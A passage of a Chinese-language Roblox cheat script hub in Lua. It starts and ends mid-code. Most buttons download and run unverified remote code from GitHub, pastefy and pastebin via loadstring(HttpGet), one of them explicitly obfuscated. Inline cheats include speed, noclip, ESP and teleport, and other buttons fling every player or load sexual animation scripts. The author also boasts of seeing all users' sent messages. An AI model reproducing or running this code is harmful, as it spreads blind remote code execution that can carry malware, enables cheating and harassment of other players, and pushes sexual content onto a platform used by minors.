                time = currentTime,
                timestamp = timestamp,
                success = false,
                error = "网络请求失败"
            })
            
            WindUI:Notify({
                Title = "发送失败", 
                Content = "消息发送失败，请检查网络连接", 
                Icon = "x-circle", 
                Duration = 4
            })
        end
    end
})

-- 3. 查看发送记录按钮【增强版】
Tab:Button({
    Title = "查看发送记录",
    Icon = "history",
    Description = "查看最近发送的消息记录",
    Callback = function()
        local text = "📋 **消息发送记录**\n\n"
        
        if #messageHistory == 0 then
            text = text .. "暂无发送记录\n\n开始发送你的第一条消息吧！"
        else
            -- 统计信息
            local total = #messageHistory
            local successCount = 0
            for _, m in ipairs(messageHistory) do
                if m.success then successCount = successCount + 1 end
            end
            
            text = text .. string.format("📊 统计: 共 %d 条，成功 %d 条\n\n", total, successCount)
            
            -- 显示最近5条记录
            local displayCount = math.min(5, #messageHistory)
            for i = #messageHistory, #messageHistory - displayCount + 1, -1 do
                local m = messageHistory[i]
                local t = os.date("%m-%d %H:%M", m.time)
                local status = m.success and "✅" or "❌"
                local pre = m.text:gsub("\n", " ")
                pre = #pre > 30 and pre:sub(1, 30) .. "..." or pre
                text = text .. string.format("%s [%s] %s\n", status, t, pre)
            end
            
            if #messageHistory > displayCount then
                text = text .. string.format("\n...还有 %d 条更早的记录", #messageHistory - displayCount)
            end
        end
        
        WindUI:Notify({
            Title = "消息记录", 
            Content = text, 
            Icon = "file-text", 
            Duration = 10
        })
    end
})

local Tab = Window:Tab({
    Title = "玩家意见反馈",
    Icon = "message-circle-reply",
    Locked = false,
    Opened = true,
})

local Section = Tab:Section({ 
    Title = "已经按照玩家要求添加了脚本",
    TextXAlignment = "Center",
    TextSize = 20
})

local Section = Tab:Section({ 
    Title = "添加服务器↓",
    TextXAlignment = "Center",
    TextSize = 18
})

local Section = Tab:Section({ 
    Title = "ohio",
    TextXAlignment = "Center",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "战争机器",
    TextXAlignment = "Center",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "压力",
    TextXAlignment = "Center",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "有两个服务器没加因为我不会玩也找不到现成的🤓",
    TextXAlignment = "Center",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "还更新了个音乐播放功能也是玩家反馈",
    TextXAlignment = "Center",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "还有别乱发消息我可是能看到你的所有信息的🤓",
    TextXAlignment = "Center",
    TextSize = 17
})

local Tab = Window:Tab({
    Title = "API汉化+绕过服务器",
    Icon = "",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "LM汉化API",
    Desc = "直接加载脚本",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lmlmlm7891/cnmsjwnrnmbdsmdx/refs/heads/main/%E4%BD%A0%E8%A6%81%E5%B9%B2%E5%95%A5%EF%BC%9F.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "感谢使用",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "复制脚本链接",
    Desc = "",
    Locked = false,
    Callback = function()
        local link = "https://raw.githubusercontent.com/lmlmlm7891/cnmsjwnrnmbdsmdx/refs/heads/main/%E4%BD%A0%E8%A6%81%E5%B9%B2%E5%95%A5%EF%BC%9F.lua"
        if setclipboard then
            setclipboard(link)
        end       
        WindUI:Notify({
            Title = "已复制",
            Content = "脚本已自动复制到剪贴板",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "🚫+18区",
    Icon = "circle-slash",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "r6录关",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
        WindUI:Notify({
            Title = "🐔绑好爽",
            Content = "🥵",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "r15录关",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
        WindUI:Notify({
            Title = "几磅好爽",
            Content = "🥵",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "操人GUI",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
        WindUI:Notify({
            Title = "别人🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "R6被操",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/r6%E8%A2%AB%E6%93%8D.txt"))()
        WindUI:Notify({
            Title = "你🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "r15被操",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/%E8%A2%AB%E6%93%8DR15.txt"))()
        WindUI:Notify({
            Title = "你🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "R6让别人给你口",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/R6%E8%AE%A9%E5%88%AB%E4%BA%BA%E7%BB%99%E4%BD%A0%E5%8F%A3.txt"))()
        WindUI:Notify({
            Title = "口🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "R15让别人给你口",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/R15%E8%AE%A9%E5%88%AB%E4%BA%BA%E7%BB%99%E4%BD%A0%E5%8F%A3.txt"))()
        WindUI:Notify({
            Title = "口🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "R6口别人",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/R6%E8%B5%A4%E5%A3%81%E6%88%96%E9%B8%A1.txt"))()
        WindUI:Notify({
            Title = "口🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "R15口别人",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/R15%E8%B5%A4%E5%A3%81%E6%88%96%E9%9B%86.txt"))()
        WindUI:Notify({
            Title = "口🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "R6后入",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/R6%E5%90%8E%E5%85%A5.txt"))()
        WindUI:Notify({
            Title = "入🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "r15后入",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/R15%E5%90%8E%E5%85%A5.txt"))()
        WindUI:Notify({
            Title = "入🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

-- 创建音乐页签
local MusicTab = Window:Tab({
    Title = "音乐播放器",
    Icon = "music",
    Locked = false,
    Opened = false,
})

-- 初始化音源
local SoundService = game:GetService("SoundService")
local BackgroundMusic = SoundService:FindFirstChild("ScriptMusic")

if not BackgroundMusic then
    BackgroundMusic = Instance.new("Sound")
    BackgroundMusic.Name = "ScriptMusic"
    BackgroundMusic.Parent = SoundService
end

-- 1. 音乐 ID 输入
MusicTab:Input({
    Title = "输入音乐 ID",
    Desc = "输入数字 ID 即可自动加载",
    Value = "",
    InputIcon = "audio-lines",
    Type = "Input",
    Placeholder = "例如: 1837874530",
    Callback = function(input) 
        local cleanId = input:match("%d+")
        if cleanId then
            BackgroundMusic.SoundId = "rbxassetid://" .. cleanId
        end
    end
})

-- 2. 播放控制
MusicTab:Button({
    Title = "开始播放",
    Desc = "播放选定的音轨",
    Callback = function()
        if BackgroundMusic.SoundId ~= "" then
            BackgroundMusic:Play()
        end
    end
})

MusicTab:Button({
    Title = "停止播放",
    Desc = "停止当前音频",
    Callback = function()
        BackgroundMusic:Stop()
    end
})

MusicTab:Toggle({
    Title = "循环模式",
    Desc = "开启后自动重播",
    Default = false,
    Callback = function(state)
        BackgroundMusic.Looped = state
    end
})


local Tab = Window:Tab({
    Title = "黑白脚本",
    Icon = "crown",
    Locked = false,
    Opened = true,
})

local Section = Tab:Section({ 
    Title = "--------------下面是遗照脚本--------------",
    TextXAlignment = "Center",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "黑白脚本",
    Desc = "给遗照脚本单开一栏",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/tfcygvunbind/Apple/main/黑白脚本加载器'))()
        WindUI:Notify({
            Title = "🐔榜",
            Content = "黑照脚本",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "通用",
    Icon = "play",
    Locked = false,
})

local Button = Tab:Button({
    Title = "通用飞",
    Desc = "好用",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/-/refs/heads/main/%E9%A3%9E%E8%A1%8C%E8%84%9A%E6%9C%ACV3(%E5%85%A8%E6%B8%B8%E6%88%8F%E9%80%9A%E7%94%A8)%20(1).txt"))()
        WindUI:Notify({
            Title = "飞",
            Content = "飞行",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "飞车",
    Desc = "通用",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lmlmlm7891/cnmsjwnrnmbdsmdx/refs/heads/main/obfuscated_script-1770182843441.lua.txt"))()
        WindUI:Notify({
            Title = "LM飞车",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Slider = Tab:Slider({
    Title = "速度",
    Desc = "修改移速",
    Step = 1,
    Value = {
        Min = 0,
        Max = 150,
        Default = 16,
    },
    Callback = function(value)
        -- 修改移动速度
        local player = game.Players.LocalPlayer
        local character = player.Character
                WindUI:Notify({
            Title = "移动速度",
            Content = "已设置为: " .. value,
            Icon = "crown",
            Duration = 3
        })
        if character and character:FindFirstChildOfClass("Humanoid") then
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            humanoid.WalkSpeed = value
        end
        
        print(value)

-- 角色重生时自动重新应用速度设置
game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    wait(1) -- 等待角色完全加载
    if character:FindFirstChildOfClass("Humanoid") then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local currentValue = Slider:GetValue()
        humanoid.WalkSpeed = currentValue
    end
end)

-- 初始应用（如果已有角色）
if game.Players.LocalPlayer.Character then
    spawn(function()
        wait(1)
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChildOfClass("Humanoid") then
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            local currentValue = Slider:GetValue()
            humanoid.WalkSpeed = currentValue
         end
     end)
  end
end
})

local Slider = Tab:Slider({
    Title = "跳跃高度",
    Desc = "修改跳跃高度",
    Step = 1,
    Value = {
        Min = 0,
        Max = 100,
        Default = 50,
    },
    Callback = function(value)
        -- 存储跳跃强度值
        _G.JumpIntensity = value
        
        -- 显示修改通知
        WindUI:Notify({
            Title = "跳跃高度",
            Content = "已设置为: " .. value,
            Icon = "crown",
            Duration = 3
        })
        
        print(value)
-- 监听跳跃事件
game:GetService("UserInputService").JumpRequest:Connect(function()
    if _G.JumpIntensity and _G.JumpIntensity > 50 then
        local player = game.Players.LocalPlayer
        local character = player.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            local hrp = character.HumanoidRootPart
            local jumpForce = (_G.JumpIntensity - 50) * 2
            hrp.Velocity = Vector3.new(hrp.Velocity.X, jumpForce, hrp.Velocity.Z)
          end
       end
   end)
end
})

Slider:Lock()

local Toggle = Tab:Toggle({
    Title = "无限跳",
    Desc = "",
    Icon = "badge-check",
    Type = "Checkbox",
    Value = false, -- 默认值
    Callback = function(state)
        local InfiniteJumpEnabled = state
        
        -- 无限跳功能
        local function infiniteJump()
            if InfiniteJumpEnabled then
                -- 监听输入
                game:GetService("UserInputService").JumpRequest:Connect(function()
                    if InfiniteJumpEnabled then
                        -- 获取本地玩家
                        local player = game.Players.LocalPlayer
                        if player and player.Character then
                            -- 给角色一个向上的力来实现跳跃
                            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                            if humanoid then
                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            end
                        end
                    end
                end)
            end
        end
        
        -- 启动无限跳
        infiniteJump()
    end
})

local Toggle = Tab:Toggle({
    Title = "穿墙",
    Desc = "",
    Icon = "badge-check",
    Type = "Checkbox",
    Value = false, -- default value
    Callback = function(state)
        _G.NoclipEnabled = state
        
        if state then
            -- 开启穿墙
            _G.NoclipConnection = game:GetService("RunService").Stepped:Connect(function()
                if _G.NoclipEnabled then
                    pcall(function()
                        local character = game.Players.LocalPlayer.Character
                        if character then
                            for _, part in pairs(character:GetDescendants()) do
                                if part:IsA("BasePart") then
                                    part.CanCollide = false
                                end
                            end
                        end
                    end)
                end
            end)
        else
            -- 关闭时只需要断开连接
            if _G.NoclipConnection then
                _G.NoclipConnection:Disconnect()
                _G.NoclipConnection = nil
            end
            -- 不修改任何碰撞属性，让游戏自然处理
        end
    end
})

local Toggle = Tab:Toggle({
    Title = "夜视",
    Desc = "",
    Icon = "badge-check",
    Type = "Checkbox",
    Value = false, -- default value
    Callback = function(state) 
        pcall(function()
            if state then
                game.Lighting.Ambient = Color3.new(1, 1, 1)
            else
                game.Lighting.Ambient = Color3.new(0, 0, 0)
            end
        end)
    end
})

local Button = Tab:Button({
    Title = "透视",
    Desc = "不可关",
    Locked = false,
    Callback = function()
           while wait(1) do
local players = game.Players:GetPlayers()

for i,v in pairs(players) do
 local esp = Instance.new("Highlight")
 esp.Name = v.Name
 esp.FillTransparency = 0.5
 esp.FillColor = Color3.new(0, 0, 0)
 esp.OutlineColor = Color3.new(255, 255, 255)
 esp.OutlineTransparency = 0
 esp.Parent = v.Character
end
end
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "触碰甩飞",
    Desc = "甩飞",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "点击传送",
    Desc = "点击传送",
    Locked = false,
    Callback = function()
        mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "点击传送"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end)
tool.Parent = game.Players.LocalPlayer.Backpack
        WindUI:Notify({
            Title = "加载成功",
            Content = "点击传送",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "转圈",
    Desc = "",
    Locked = false,
    Callback = function()
-- 创建UI元素
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RotationUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 100
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- 主框架
local MainFrame = Instance.new("Frame")
MainFrame.Name = "RotationFrame"
MainFrame.Size = UDim2.new(0, 220, 0, 130)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -65)
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
MainFrame.BackgroundTransparency = 0.3
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

-- 标题栏
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 30)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TitleBar.BackgroundTransparency = 0.5
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

-- 标题文本
local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(0.7, 0, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "旋转控制"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18
Title.Font = Enum.Font.Gotham
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.TextYAlignment = Enum.TextYAlignment.Center
Title.Parent = TitleBar

-- 最小化按钮
local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Name = "MinimizeButton"
MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
MinimizeButton.Position = UDim2.new(1, -60, 0, 0)
MinimizeButton.BackgroundColor3 = Color3.fromRGB(80, 160, 220)
MinimizeButton.Text = "_"
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.TextSize = 20
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.Parent = TitleBar

-- 关闭按钮
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -30, 0, 0)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 18
CloseButton.Font = Enum.Font.Gotham
CloseButton.Parent = TitleBar

-- 内容区域
local ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Size = UDim2.new(1, 0, 1, -30)
ContentFrame.Position = UDim2.new(0, 0, 0, 30)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = MainFrame

-- 旋转控制按钮
local RotateButton = Instance.new("TextButton")
RotateButton.Name = "RotateButton"
RotateButton.Size = UDim2.new(0.8, 0, 0, 40)
RotateButton.Position = UDim2.new(0.1, 0, 0.1, 0)
RotateButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
RotateButton.Text = "开始旋转"
RotateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
RotateButton.TextSize = 16
RotateButton.Font = Enum.Font.GothamBold
RotateButton.Parent = ContentFrame

-- 速度输入区域
local SpeedInputFrame = Instance.new("Frame")
SpeedInputFrame.Name = "SpeedInputFrame"
SpeedInputFrame.Size = UDim2.new(0.8, 0, 0, 50)
SpeedInputFrame.Position = UDim2.new(0.1, 0, 0.7, 0)
SpeedInputFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
SpeedInputFrame.BackgroundTransparency = 0.5
SpeedInputFrame.BorderSizePixel = 0
SpeedInputFrame.Parent = ContentFrame

local SpeedLabel = Instance.new("TextLabel")
SpeedLabel.Name = "SpeedLabel"
SpeedLabel.Size = UDim2.new(1, 0, 0.4, 0)
SpeedLabel.Position = UDim2.new(0, 5, 0, 0)
SpeedLabel.BackgroundTransparency = 1
SpeedLabel.Text = "旋转速度 (1-10000):"
SpeedLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
SpeedLabel.TextSize = 12
SpeedLabel.TextXAlignment = Enum.TextXAlignment.Left
SpeedLabel.TextYAlignment = Enum.TextYAlignment.Center
SpeedLabel.Parent = SpeedInputFrame

local SpeedInputBox = Instance.new("TextBox")
SpeedInputBox.Name = "SpeedInputBox"
SpeedInputBox.Size = UDim2.new(0.9, 0, 0.5, 0)
SpeedInputBox.Position = UDim2.new(0.05, 0, 0.45, 0)
SpeedInputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
SpeedInputBox.BorderSizePixel = 1
SpeedInputBox.BorderColor3 = Color3.fromRGB(100, 100, 100)
SpeedInputBox.Text = "500"
SpeedInputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
SpeedInputBox.TextSize = 14
SpeedInputBox.TextXAlignment = Enum.TextXAlignment.Center
SpeedInputBox.PlaceholderText = "输入1-10000"
SpeedInputBox.ClearTextOnFocus = false
SpeedInputBox.Parent = SpeedInputFrame

-- 最小化后的按钮
local MiniButton = Instance.new("TextButton")
MiniButton.Name = "MiniButton"
MiniButton.Size = UDim2.new(0, 60, 0, 35)
MiniButton.Position = UDim2.new(0, 20, 0, 20) -- 默认位置
MiniButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
MiniButton.BackgroundTransparency = 0.3
MiniButton.BorderSizePixel = 1
MiniButton.BorderColor3 = Color3.fromRGB(100, 100, 100)
MiniButton.Text = "旋转"
MiniButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MiniButton.TextSize = 14
MiniButton.Font = Enum.Font.Gotham
MiniButton.Visible = false
MiniButton.Active = true
MiniButton.Draggable = true
MiniButton.Parent = ScreenGui

-- 旋转控制变量
local isRotating = false
local rotationSpeed = 500
local connection

-- 新增：记录位置
local savedMiniButtonPosition = UDim2.new(0, 20, 0, 20) -- 初始位置
local savedMainFramePosition = MainFrame.Position -- 记录主窗口位置

-- 记录MiniButton位置的函数
local function saveMiniButtonPosition()
    savedMiniButtonPosition = MiniButton.Position
end

-- 记录MainFrame位置的函数
local function saveMainFramePosition()
    savedMainFramePosition = MainFrame.Position
end

-- 设置MiniButton位置监听
game:GetService("RunService").Heartbeat:Connect(function()
    if MiniButton.Visible then
        saveMiniButtonPosition()
    else
        saveMainFramePosition()
    end
end)

-- 旋转函数
local function rotateCharacter()
    if isRotating then
        local player = game.Players.LocalPlayer
        if player and player.Character then
            local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                local speedMultiplier = rotationSpeed / 100
                humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(0, math.rad(speedMultiplier), 0)
            end
        end
    end
end

-- 更新速度函数
local function updateSpeed()
    local text = SpeedInputBox.Text
    if text == "" then
        rotationSpeed = 500
        SpeedInputBox.Text = "500"
        return
    end
    
    local num = tonumber(text)
    if num then
        if num < 1 then
            rotationSpeed = 1
            SpeedInputBox.Text = "1"
        elseif num > 10000 then
            rotationSpeed = 10000
            SpeedInputBox.Text = "10000"
        else
            rotationSpeed = math.floor(num + 0.5)
            SpeedInputBox.Text = tostring(rotationSpeed)
        end
    else
        rotationSpeed = 500
        SpeedInputBox.Text = "500"
    end
end

-- 输入框验证
SpeedInputBox.FocusLost:Connect(function()
    updateSpeed()
end)

SpeedInputBox:GetPropertyChangedSignal("Text"):Connect(function()
    if SpeedInputBox:IsFocused() then
        local text = SpeedInputBox.Text
        local newText = string.gsub(text, "[^0-9]", "")
        if newText ~= text then
            SpeedInputBox.Text = newText
        end
    end
end)

-- 旋转按钮点击事件
local function toggleRotation()
    isRotating = not isRotating
    
    if isRotating then
        RotateButton.Text = "停止旋转"
        RotateButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
        MiniButton.Text = "旋转中"
        MiniButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
        
        if connection then
            connection:Disconnect()
        end
        connection = game:GetService("RunService").RenderStepped:Connect(function()
            rotateCharacter()
        end)
    else
        RotateButton.Text = "开始旋转"
        RotateButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
        MiniButton.Text = "旋转"
        MiniButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
        
        if connection then
            connection:Disconnect()
            connection = nil
        end
    end
end

RotateButton.MouseButton1Click:Connect(toggleRotation)

-- 修复：最小化按钮点击事件 - 记录主窗口位置并使用保存的小按钮位置
MinimizeButton.MouseButton1Click:Connect(function()
    -- 保存主窗口当前位置
    saveMainFramePosition()
    
    -- 显示小按钮，使用上次保存的位置
    MainFrame.Visible = false
    MiniButton.Visible = true
    MiniButton.Position = savedMiniButtonPosition
    
    print("已最小化，小按钮位置:", 
        math.floor(savedMiniButtonPosition.X.Offset), 
        math.floor(savedMiniButtonPosition.Y.Offset))
end)

-- 修复：小按钮点击事件 - 恢复窗口并记录小按钮位置
MiniButton.MouseButton1Click:Connect(function()
    -- 保存小按钮当前位置
    saveMiniButtonPosition()
    
    -- 恢复主窗口，使用上次保存的主窗口位置
    MainFrame.Visible = true
    MiniButton.Visible = false
    MainFrame.Position = savedMainFramePosition
    
    print("已恢复，主窗口位置:", 
        math.floor(savedMainFramePosition.X.Offset), 
        math.floor(savedMainFramePosition.Y.Offset))
end)

-- 小按钮右键点击（切换旋转状态）
MiniButton.MouseButton2Click:Connect(toggleRotation)

-- 关闭按钮事件
CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- 鼠标悬停效果
RotateButton.MouseEnter:Connect(function()
    if not isRotating then
        RotateButton.BackgroundColor3 = Color3.fromRGB(80, 140, 220)
    end
end)

RotateButton.MouseLeave:Connect(function()
    if not isRotating then
        RotateButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
    end
end)

MinimizeButton.MouseEnter:Connect(function()
    MinimizeButton.BackgroundColor3 = Color3.fromRGB(100, 180, 240)
end)

MinimizeButton.MouseLeave:Connect(function()
    MinimizeButton.BackgroundColor3 = Color3.fromRGB(80, 160, 220)
end)

CloseButton.MouseEnter:Connect(function()
    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
end)

CloseButton.MouseLeave:Connect(function()
    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
end)

MiniButton.MouseEnter:Connect(function()
    MiniButton.BackgroundTransparency = 0.1
    MiniButton.BorderColor3 = Color3.fromRGB(150, 150, 150)
end)

MiniButton.MouseLeave:Connect(function()
    MiniButton.BackgroundTransparency = 0.3
    MiniButton.BorderColor3 = Color3.fromRGB(100, 100, 100)
end)

SpeedInputBox.MouseEnter:Connect(function()
    SpeedInputBox.BorderColor3 = Color3.fromRGB(120, 120, 120)
end)

SpeedInputBox.MouseLeave:Connect(function()
    if not SpeedInputBox:IsFocused() then
        SpeedInputBox.BorderColor3 = Color3.fromRGB(100, 100, 100)
    end
end)

SpeedInputBox.Focused:Connect(function()
    SpeedInputBox.BorderColor3 = Color3.fromRGB(60, 120, 200)
end)

SpeedInputBox.FocusLost:Connect(function()
    SpeedInputBox.BorderColor3 = Color3.fromRGB(100, 100, 100)
end)

-- 初始化
updateSpeed()

-- 清理函数
local function cleanup()
    if connection then
        connection:Disconnect()
        connection = nil
    end
    isRotating = false
    RotateButton.Text = "开始旋转"
    RotateButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
    MiniButton.Text = "旋转"
    MiniButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
end

-- 角色重生时清理
game.Players.LocalPlayer.CharacterAdded:Connect(cleanup)

-- 添加快捷键
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.Up then
        rotationSpeed = math.min(rotationSpeed + 100, 10000)
        SpeedInputBox.Text = tostring(rotationSpeed)
    elseif input.KeyCode == Enum.KeyCode.Down then
        rotationSpeed = math.max(rotationSpeed - 100, 1)
        SpeedInputBox.Text = tostring(rotationSpeed)
    end
end)
        WindUI:Notify({
            Title = "转圈",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "防甩飞",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ChinaQY/Scripts/Main/AntiFling.lua"))()
        WindUI:Notify({
            Title = "防甩",
            Content = "防甩",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "甩所有人",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "秒互动",
    Desc = "",
    Locked = false,
    Callback = function()
local ProximityPromptService = game:GetService("ProximityPromptService")

local lastInteractionTime = 0
local INTERACTION_DELAY = 0.5 -- 0.5秒互动一次

ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
    local currentTime = tick()
    
    -- 检查是否达到互动间隔
    if currentTime - lastInteractionTime >= INTERACTION_DELAY then
        fireproximityprompt(prompt)
        lastInteractionTime = currentTime
    end
end)
        WindUI:Notify({
            Title = "秒互动",
            Content = "已加载",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "传送到玩家位置",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lmlmlm7891/cnmsjwnrnmbdsmdx/refs/heads/main/%E4%BC%A0%E9%80%81%E7%8E%A9%E5%AE%B6"))()
        WindUI:Notify({
            Title = "加载成功",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "保存位置加传送",
    Desc = "",
    Locked = false,
    Callback = function()
        local Players = game:GetService("Players")
local Player = Players.LocalPlayer

-- 防止重复注入，先清理旧UI
